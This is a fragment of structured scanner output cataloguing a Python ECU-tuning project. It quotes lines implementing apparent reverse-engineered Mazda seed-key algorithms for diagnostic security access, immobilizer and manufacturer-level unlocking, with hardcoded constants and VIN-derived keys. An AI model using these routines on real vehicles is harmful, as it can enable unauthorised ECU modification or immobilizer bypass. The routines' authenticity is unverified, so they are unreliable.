"ECU", "content": "logger.error(\"Failed to calculate security key\")"}, {"type": "hardware", "line": 242, "hardware": "ECU", "content": "if self._send_security_key(level, key):"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "self.current_security_level = level"}, {"type": "hardware", "line": 244, "hardware": "ECU", "content": "logger.info(f\"Security access granted at level {level}\")"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "logger.error(\"ECU rejected security key\")"}, {"type": "hardware", "line": 251, "hardware": "ECU", "content": "logger.error(f\"Error requesting security access: {e}\")"}, {"type": "hardware", "line": 254, "hardware": "ECU", "content": "def _request_security_seed(self, level: SecurityLevel) -> Optional[bytes]:"}, {"type": "hardware", "line": 255, "hardware": "ECU", "content": "\"\"\"Request security seed from ECU\"\"\""}, {"type": "hardware", "line": 261, "hardware": "ECU", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x27, bytes([level]))"}, {"type": "hardware", "line": 273, "hardware": "ECU", "content": "logger.error(f\"Error requesting security seed: {e}\")"}, {"type": "hardware", "line": 276, "hardware": "ECU", "content": "def _send_security_key(self, level: SecurityLevel, key: bytes) -> bool:"}, {"type": "hardware", "line": 277, "hardware": "ECU", "content": "\"\"\"Send security key to ECU\"\"\""}, {"type": "hardware", "line": 283, "hardware": "ECU", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x27, bytes([level + 0x01]) + key)"}, {"type": "hardware", "line": 294, "hardware": "ECU", "content": "logger.error(f\"Error sending security key: {e}\")"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "\"\"\"Main ECU 0x27 security algorithm - factory dealer level\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "\"\"\"Enhanced 0x27 security algorithm\"\"\""}, {"type": "hardware", "line": 341, "hardware": "TCM", "content": "def _mazda_tcm_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "hardware", "line": 342, "hardware": "ECU", "content": "\"\"\"TCM security algorithm\"\"\""}, {"type": "hardware", "line": 342, "hardware": "TCM", "content": "\"\"\"TCM security algorithm\"\"\""}, {"type": "hardware", "line": 357, "hardware": "TCM", "content": "logger.error(f\"Error in TCM algorithm: {e}\")"}, {"type": "hardware", "line": 360, "hardware": "immobilizer", "content": "def _mazda_immobilizer_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "hardware", "line": 361, "hardware": "immobilizer", "content": "\"\"\"Immobilizer algorithm using VIN-derived keys\"\"\""}, {"type": "hardware", "line": 366, "hardware": "immobilizer", "content": "vin_key = self.vin_derived_keys.get('immobilizer')"}, {"type": "hardware", "line": 379, "hardware": "immobilizer", "content": "logger.error(f\"Error in immobilizer algorithm: {e}\")"}, {"type": "hardware", "line": 431, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "hardware", "line": 432, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "hardware", "line": 433, "hardware": "immobilizer", "content": "self.vin_derived_keys['immobilizer'] = key[:24]"}, {"type": "hardware", "line": 439, "hardware": "ECU", "content": "base_key = hashlib.sha256(vin_bytes + b'mazda_mfg_l2_2024_secure').digest()"}, {"type": "hardware", "line": 473, "hardware": "ECU", "content": "if self.current_security_level < region.access_level:"}, {"type": "hardware", "line": 474, "hardware": "ECU", "content": "logger.error(f\"Insufficient security level for {region_name}\")"}, {"type": "hardware", "line": 475, "hardware": "ECU", "content": "logger.info(f\"Required: {region.access_level}, Current: {self.current_security_level}\")"}, {"type": "hardware", "line": 508, "hardware": "ECU", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x23, payload[1:])"}, {"type": "hardware", "line": 542, "hardware": "ECU", "content": "if self.current_security_level < region.access_level:"}, {"type": "hardware", "line": 543, "hardware": "ECU", "content": "logger.error(f\"Insufficient security level for writing {region_name}\")"}, {"type": "hardware", "line": 585, "hardware": "ECU", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x3D, payload[1:])"}, {"type": "hardware", "line": 617, "hardware": "ECU", "content": "'accessible': self.current_security_level >= region.access_level"}], "security_logic": [{"type": "security_pattern", "line": 12, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 17, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 17, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 83, "pattern": "algorithm", "content": "self.security_algorithms = self._initialize_security_algorithms()"}, {"type": "security_pattern", "line": 86, "pattern": "key", "content": "self.vin_derived_keys = {}"}, {"type": "security_pattern", "line": 113, "pattern": "algorithm", "content": "def _initialize_security_algorithms(self) -> Dict[str, Any]:"}, {"type": "security_pattern", "line": 114, "pattern": "algorithm", "content": "\"\"\"Initialize reverse-engineered security algorithms\"\"\""}, {"type": "security_pattern", "line": 115, "pattern": "algorithm", "content": "algorithms = {"}, {"type": "security_pattern", "line": 116, "pattern": "algorithm", "content": "'mazda_27_standard': self._mazda_27_algorithm,"}, {"type": "security_pattern", "line": 117, "pattern": "algorithm", "content": "'mazda_27_enhanced': self._mazda_27_enhanced_algorithm,"}, {"type": "security_pattern", "line": 118, "pattern": "algorithm", "content": "'mazda_tcm_6spd': self._mazda_tcm_algorithm,"}, {"type": "security_pattern", "line": 119, "pattern": "algorithm", "content": "'mazda_immobilizer': self._mazda_immobilizer_algorithm,"}, {"type": "security_pattern", "line": 120, "pattern": "algorithm", "content": "'mazda_manufacturer_l1': self._mazda_manufacturer_l1_algorithm,"}, {"type": "security_pattern", "line": 121, "pattern": "algorithm", "content": "'mazda_manufacturer_l2': self._mazda_manufacturer_l2_algorithm"}, {"type": "security_pattern", "line": 124, "pattern": "algorithm", "content": "logger.debug(f\"Initialized {len(algorithms)} security algorithms\")"}, {"type": "security_pattern", "line": 125, "pattern": "algorithm", "content": "return algorithms"}, {"type": "security_pattern", "line": 197, "pattern": "key", "content": "self._derive_vin_keys(vehicle_info['vin'])"}, {"type": "security_pattern", "line": 206, "pattern": "security_access", "content": "def request_security_access(self, level: SecurityLevel,"}, {"type": "security_pattern", "line": 207, "pattern": "algorithm", "content": "algorithm_name: str = 'mazda_27_standard') -> bool:"}, {"type": "security_pattern", "line": 213, "pattern": "key", "content": "algorithm_name: Algorithm to use for key calculation"}, {"type": "security_pattern", "line": 213, "pattern": "algorithm", "content": "algorithm_name: Algorithm to use for key calculation"}, {"type": "security_pattern", "line": 222, "pattern": "authorization", "content": "logger.warning(f\"Security level {level} requires additional authorization\")"}, {"type": "security_pattern", "line": 225, "pattern": "seed", "content": "seed = self._request_security_seed(level)"}, {"type": "security_pattern", "line": 226, "pattern": "seed", "content": "if not seed:"}, {"type": "security_pattern", "line": 227, "pattern": "seed", "content": "logger.error(\"Failed to obtain security seed\")"}, {"type": "security_pattern", "line": 231, "pattern": "algorithm", "content": "algorithm = self.security_algorithms.get(algorithm_name)"}, {"type": "security_pattern", "line": 232, "pattern": "algorithm", "content": "if not algorithm:"}, {"type": "security_pattern", "line": 233, "pattern": "algorithm", "content": "logger.error(f\"Unknown security algorithm: {algorithm_name}\")"}, {"type": "security_pattern", "line": 236, "pattern": "key", "content": "key = algorithm(seed)"}, {"type": "security_pattern", "line": 236, "pattern": "seed", "content": "key = algorithm(seed)"}, {"type": "security_pattern", "line": 236, "pattern": "algorithm", "content": "key = algorithm(seed)"}, {"type": "security_pattern", "line": 237, "pattern": "key", "content": "if not key:"}, {"type": "security_pattern", "line": 238, "pattern": "key", "content": "logger.error(\"Failed to calculate security key\")"}, {"type": "security_pattern", "line": 242, "pattern": "key", "content": "if self._send_security_key(level, key):"}, {"type": "security_pattern", "line": 247, "pattern": "key", "content": "logger.error(\"ECU rejected security key\")"}, {"type": "security_pattern", "line": 254, "pattern": "seed", "content": "def _request_security_seed(self, level: SecurityLevel) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 255, "pattern": "seed", "content": "\"\"\"Request security seed from ECU\"\"\""}, {"type": "security_pattern", "line": 259, "pattern": "seed", "content": "seed_request = bytes([0x27, level])"}, {"type": "security_pattern", "line": 267, "pattern": "seed", "content": "seed_length = len(response) - 2"}, {"type": "security_pattern", "line": 268, "pattern": "seed", "content": "return response[2:2+seed_length]"}, {"type": "security_pattern", "line": 273, "pattern": "seed", "content": "logger.error(f\"Error requesting security seed: {e}\")"}, {"type": "security_pattern", "line": 276, "pattern": "key", "content": "def _send_security_key(self, level: SecurityLevel, key: bytes) -> bool:"}, {"type": "security_pattern", "line": 277, "pattern": "key", "content": "\"\"\"Send security key to ECU\"\"\""}, {"type": "security_pattern", "line": 281, "pattern": "key", "content": "key_send = bytes([0x27, level + 0x01]) + key"}, {"type": "security_pattern", "line": 283, "pattern": "key", "content": "response = self.ecu_core.send_diagnostic_message('engine', 0x27, bytes([level + 0x01]) + key)"}, {"type": "security_pattern", "line": 294, "pattern": "key", "content": "logger.error(f\"Error sending security key: {e}\")"}, {"type": "security_pattern", "line": 299, "pattern": "seed", "content": "def _mazda_27_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 299, "pattern": "algorithm", "content": "def _mazda_27_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 300, "pattern": "algorithm", "content": "\"\"\"Main ECU 0x27 security algorithm - factory dealer level\"\"\""}, {"type": "security_pattern", "line": 302, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 305, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 309, "pattern": "key", "content": "key[i] = (seed[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 309, "pattern": "seed", "content": "key[i] = (seed[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 310, "pattern": "key", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "security_pattern", "line": 311, "pattern": "key", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 313, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 316, "pattern": "algorithm", "content": "logger.error(f\"Error in Mazda 27 algorithm: {e}\")"}, {"type": "security_pattern", "line": 319, "pattern": "seed", "content": "def _mazda_27_enhanced_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 319, "pattern": "algorithm", "content": "def _mazda_27_enhanced_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 320, "pattern": "algorithm", "content": "\"\"\"Enhanced 0x27 security algorithm\"\"\""}, {"type": "security_pattern", "line": 322, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 325, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 328, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 333, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 335, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 338, "pattern": "algorithm", "content": "logger.error(f\"Error in enhanced 27 algorithm: {e}\")"}, {"type": "security_pattern", "line": 341, "pattern": "seed", "content": "def _mazda_tcm_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 341, "pattern": "algorithm", "content": "def _mazda_tcm_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 342, "pattern": "algorithm", "content": "\"\"\"TCM security algorithm\"\"\""}, {"type": "security_pattern", "line": 344, "pattern": "seed", "content": "if len(seed) != 2:"}, {"type": "security_pattern", "line": 347, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 349, "pattern": "key", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 349, "pattern": "seed", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 350, "pattern": "key", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 350, "pattern": "seed", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 351, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 352, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 354, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 357, "pattern": "algorithm", "content": "logger.error(f\"Error in TCM algorithm: {e}\")"}, {"type": "security_pattern", "line": 360, "pattern": "seed", "content": "def _mazda_immobilizer_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 360, "pattern": "algorithm", "content": "def _mazda_immobilizer_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 361, "pattern": "key", "content": "\"\"\"Immobilizer algorithm using VIN-derived keys\"\"\""}, {"type": "security_pattern", "line": 361, "pattern": "algorithm", "content": "\"\"\"Immobilizer algorithm using VIN-derived keys\"\"\""}, {"type": "security_pattern", "line": 363, "pattern": "key", "content": "if len(seed) != 8 or not self.vin_derived_keys:"}, {"type": "security_pattern", "line": 363, "pattern": "seed", "content": "if len(seed) != 8 or not self.vin_derived_keys:"}, {"type": "security_pattern", "line": 366, "pattern": "key", "content": "vin_key = self.vin_derived_keys.get('immobilizer')"}, {"type": "security_pattern", "line": 367, "pattern": "key", "content": "if not vin_key:"}, {"type": "security_pattern", "line": 371, "pattern": "key", "content": "des_key = vin_key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 372, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 372, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 372, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 373, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 373, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 375, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 375, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 375, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 376, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 379, "pattern": "algorithm", "content": "logger.error(f\"Error in immobilizer algorithm: {e}\")"}, {"type": "security_pattern", "line": 382, "pattern": "seed", "content": "def _mazda_manufacturer_l1_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 382, "pattern": "algorithm", "content": "def _mazda_manufacturer_l1_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 383, "pattern": "algorithm", "content": "\"\"\"Manufacturer level 1 algorithm\"\"\""}, {"type": "security_pattern", "line": 385, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 389, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key_l1()"}, {"type": "security_pattern", "line": 391, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 391, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 391, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 392, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 392, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 394, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 394, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 394, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 395, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 398, "pattern": "algorithm", "content": "logger.error(f\"Error in manufacturer L1 algorithm: {e}\")"}, {"type": "security_pattern", "line": 401, "pattern": "seed", "content": "def _mazda_manufacturer_l2_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 401, "pattern": "algorithm", "content": "def _mazda_manufacturer_l2_algorithm(self, seed: bytes) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 402, "pattern": "algorithm", "content": "\"\"\"Manufacturer level 2 algorithm\"\"\""}, {"type": "security_pattern", "line": 404, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 407, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key_l2()"}, {"type": "security_pattern", "line": 409, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 409, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 409, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 410, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 410, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 413, "pattern": "seed", "content": "transformed_seed = bytearray(seed)"}, {"type": "security_pattern", "line": 415, "pattern": "seed", "content": "transformed_seed[i] = (transformed_seed[i] ^ 0xAA) + i"}, {"type": "security_pattern", "line": 417, "pattern": "key", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 417, "pattern": "encrypt", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 417, "pattern": "seed", "content": "key = encryptor.update(bytes(transformed_seed)) + encryptor.finalize()"}, {"type": "security_pattern", "line": 418, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 421, "pattern": "algorithm", "content": "logger.error(f\"Error in manufacturer L2 algorithm: {e}\")"}, {"type": "security_pattern", "line": 424, "pattern": "key", "content": "def _derive_vin_keys(self, vin: str):"}, {"type": "security_pattern", "line": 425, "pattern": "key", "content": "\"\"\"Derive various keys from VIN\"\"\""}, {"type": "security_pattern", "line": 430, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 430, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 431, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 431, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 432, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 432, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 433, "pattern": "key", "content": "self.vin_derived_keys['immobilizer'] = key[:24]"}, {"type": "security_pattern", "line": 436, "pattern": "key", "content": "base_key = hashlib.sha256(vin_bytes + b'mazda_mfg_l1_2024').digest()"}, {"type": "security_pattern", "line": 436, "pattern": "hash", "content": "base_key = hashlib.sha256(vin_bytes + b'mazda_mfg_l1_2024').digest()"}, {"type": "security_pattern", "line": 437, "pattern": "key", "content": "self.vin_derived_keys['manufacturer_l1'] = base_key[:16]"}, {"type": "security_pattern", "line": 439, "pattern": "key", "content": "base_key = hashlib.sha256(vin_bytes + b'mazda_mfg_l2_2024_secure').digest()"}, {"type": "security_pattern", "line": 439, "pattern": "hash", "content": "base_key = hashlib.sha256(vin_bytes + b'mazda_mfg_l2_2024_secure').digest()"}, {"type": "security_pattern", "line": 440, "pattern": "key", "content": "self.vin_derived_keys['manufacturer_l2'] = base_key[:16]"}, {"type": "security_pattern", "line": 442, "pattern": "key", "content": "logger.debug(\"VIN-derived keys initialized\")"}, {"type": "security_pattern", "line": 445, "pattern": "key", "content": "logger.error(f\"Error deriving VIN keys: {e}\")"}, {"type": "security_pattern", "line": 447, "pattern": "key", "content": "def _get_manufacturer_key_l1(self) -> bytes:"}, {"type": "security_pattern", "line": 448, "pattern": "key", "content": "\"\"\"Get manufacturer level 1 key\"\"\""}, {"type": "security_pattern", "line": 449, "pattern": "key", "content": "return self.vin_derived_keys.get('manufacturer_l1', b'default_mfg_key_16b')"}, {"type": "security_pattern", "line": 451, "pattern": "key", "content": "def _get_manufacturer_key_l2(self) -> bytes:"}, {"type": "security_pattern", "line": 452, "pattern": "key", "content": "\"\"\"Get manufacturer level 2 key\"\"\""}, {"type": "security_pattern", "line": 453, "pattern": "key", "content": "return self.vin_derived_keys.get('manufacturer_l2', b'default_mfg_key_16b')"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/core/__init__.py", "lines_read": 23, "features_found": [{"type": "import", "module": ".ecu_communication", "line": null}, {"type": "import", "module": ".safety_validator", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "SafetyValidator,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "Provides access to core ECU communication and safety validation modules"}, {"type": "hardware", "line": 9, "hardware": "ECU", "content": "from .ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "'ECUCommunicator',"}, {"type": "hardware", "line": 14, "hardware": "ECU", "content": "'ECUResponse',"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "'ECUState',"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/core/ecu_communication.py", "lines_read": 84, "features_found": [{"type": "function", "name": "__init__", "line": 34}, {"type": "function", "name": "connect", "line": 40}, {"type": "function", "name": "disconnect", "line": 51}, {"type": "function", "name": "send_command", "line": 56}, {"type": "function", "name": "get_state", "line": 74}, {"type": "function", "name": "set_state", "line": 78}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "time", "line": null}], "components_found": [{"type": "class", "name": "ECUResponse", "line": 16}, {"type": "class", "name": "ECUState", "line": 23}, {"type": "class", "name": "ECUCommunicator", "line": 31}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "ECU", "content": "ECU COMMUNICATION MODULE"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "Mock implementation for core.ecu_communication"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "class ECUResponse:"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "\"\"\"ECU Response data structure\"\"\""}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "class ECUState(IntEnum):"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "\"\"\"ECU connection states\"\"\""}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "class ECUCommunicator:"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "\"\"\"ECU Communication handler\"\"\""}, {"type": "hardware", "line": 36, "hardware": "ECU", "content": "self.state = ECUState.DISCONNECTED"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "logger.debug(f\"ECUCommunicator initialized with interface: {interface}\")"}, {"type": "hardware", "line": 41, "hardware": "ECU", "content": "\"\"\"Connect to ECU\"\"\""}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "self.state = ECUState.CONNECTED"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "logger.info(f\"ECU connected via {self.interface}\")"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "logger.error(f\"ECU connection failed: {e}\")"}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "self.state = ECUState.ERROR"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "\"\"\"Disconnect from ECU\"\"\""}, {"type": "hardware", "line": 53, "hardware": "ECU", "content": "self.state = ECUState.DISCONNECTED"}, {"type": "hardware", "line": 54, "hardware": "ECU", "content": "logger.info(\"ECU disconnected\")"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "def send_command(self, command: bytes, timeout: float = 5.0) -> ECUResponse:"}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "\"\"\"Send command to ECU\"\"\""}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "if self.state != ECUState.CONNECTED:"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "return ECUResponse(success=False, data=b'', error_code=1)"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "self.last_response = ECUResponse(success=True, data=response_data, timestamp=time.time())"}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "return ECUResponse(success=False, data=b'', error_code=2)"}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "def get_state(self) -> ECUState:"}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "\"\"\"Get current ECU state\"\"\""}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "def set_state(self, state: ECUState):"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "\"\"\"Set ECU state\"\"\""}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "logger.debug(f\"ECU state changed to: {state.name}\")"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "logger.info(\"ECU communication module loaded\")"}], "security_logic": [{"type": "security_pattern", "line": 27, "pattern": "authenticate", "content": "AUTHENTICATED = 2"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/core/safety_validator.py", "lines_read": 230, "features_found": [{"type": "function", "name": "get_safety_validator", "line": 221}, {"type": "function", "name": "create_safety_validator", "line": 225}, {"type": "function", "name": "__init__", "line": 17}, {"type": "function", "name": "validate_parameter", "line": 56}, {"type": "function", "name": "validate_map", "line": 80}, {"type": "function", "name": "_validate_ignition_timing", "line": 107}, {"type": "function", "name": "_validate_fuel_injection", "line": 127}, {"type": "function", "name": "_validate_boost_control", "line": 147}, {"type": "function", "name": "_validate_rpm_limiter", "line": 167}, {"type": "function", "name": "_validate_vvt_timing", "line": 180}, {"type": "function", "name": "get_limits", "line": 196}, {"type": "function", "name": "set_limit", "line": 200}, {"type": "function", "name": "validate_calibration_package", "line": 205}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "numpy", "line": null}], "components_found": [{"type": "class", "name": "SafetyValidator", "line": 14}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 15, "hardware": "ECU", "content": "\"\"\"Safety parameter validation for ECU tuning\"\"\""}, {"type": "hardware", "line": 121, "hardware": "ABS", "content": "max_gradient = np.max(np.abs(gradients))"}, {"type": "hardware", "line": 141, "hardware": "ABS", "content": "max_gradient = np.max(np.abs(gradients))"}, {"type": "hardware", "line": 161, "hardware": "ABS", "content": "max_gradient = np.max(np.abs(gradients))"}], "security_logic": [{"type": "security_pattern", "line": 66, "pattern": "key", "content": "max_key = f'max_{parameter}'"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "min_key = f'min_{parameter}'"}, {"type": "security_pattern", "line": 69, "pattern": "key", "content": "if max_key in self.limits and value > self.limits[max_key]:"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "if min_key in self.limits and value < self.limits[min_key]:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/integration_test.py", "lines_read": 656, "features_found": [{"type": "function", "name": "__init__", "line": 29}, {"type": "function", "name": "run_all_tests", "line": 35}, {"type": "function", "name": "test_import_dependencies", "line": 74}, {"type": "function", "name": "test_ecu_core_initialization", "line": 120}, {"type": "function", "name": "test_advanced_access_initialization", "line": 143}, {"type": "function", "name": "test_calibration_manager_initialization", "line": 167}, {"type": "function", "name": "test_component_integration", "line": 193}, {"type": "function", "name": "test_mock_vehicle_connection", "line": 217}, {"type": "function", "name": "test_security_access_simulation", "line": 246}, {"type": "function", "name": "test_calibration_read_simulation", "line": 272}, {"type": "function", "name": "test_calibration_modification", "line": 293}, {"type": "function", "name": "test_performance_tune_generation", "line": 322}, {"type": "function", "name": "test_file_operations", "line": 347}, {"type": "function", "name": "test_complete_workflow", "line": 376}, {"type": "function", "name": "_create_mock_calibration", "line": 439}, {"type": "function", "name": "_create_mock_mds6", "line": 516}, {"type": "function", "name": "_create_mock_mds8", "line": 547}, {"type": "function", "name": "_create_mock_mds9", "line": 573}, {"type": "function", "name": "_create_mock_mds14", "line": 594}, {"type": "function", "name": "print_test_summary", "line": 609}, {"type": "function", "name": "get_overall_result", "line": 639}, {"type": "function", "name": "__init__", "line": 528}, {"type": "function", "name": "connect", "line": 533}, {"type": "function", "name": "connect_channel", "line": 536}, 